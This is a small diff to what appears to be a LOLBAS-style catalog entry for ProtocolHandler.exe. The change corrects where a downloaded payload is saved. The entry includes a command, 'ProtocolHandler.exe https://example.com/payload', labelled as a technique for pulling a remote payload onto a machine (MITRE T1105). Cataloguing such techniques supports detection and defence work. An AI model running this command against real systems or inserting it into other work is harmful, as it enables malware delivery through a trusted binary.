@@ -6,7 +6,7 @@ Created: 2022-07-24
 Commands:
   - Command: ProtocolHandler.exe https://example.com/payload
     Description: Downloads payload from remote server
-    Usecase: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Usecase: It will download a remote payload and place it in the Downloads folder
     Category: Download
     Privileges: User
     MitreID: T1105
